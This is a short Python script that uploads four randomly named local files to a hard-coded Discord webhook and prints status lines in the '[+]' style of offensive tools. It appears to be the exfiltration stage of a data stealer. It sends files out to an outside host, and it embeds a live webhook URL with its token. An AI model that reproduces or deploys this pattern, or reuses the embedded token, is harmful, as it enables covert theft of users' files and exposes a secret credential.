import requests

webhook = "https://discord.com/api/webhooks/1447613284323823717/t6ihUEIISB-4xUY_BSf2n5JiW4YjkhykfKJDwVGYTg9CgUgh3B12FhyYZVwGqLF473Pd"

files_to_upload = [
    "ziltE7NM",
    "zirsp5x2",
    "ziRZcZca",
    "ziYbuVWf"
]

for file_name in files_to_upload:
    try:
        with open(file_name, "rb") as f:
            response = requests.post(
                webhook,
                files={"file": (file_name, f)}
            )
        
        print(f"[+] {file_name} upload status:", response.status_code)

    except Exception as e:
        print(f"[!] Error uploading {file_name}:", e)
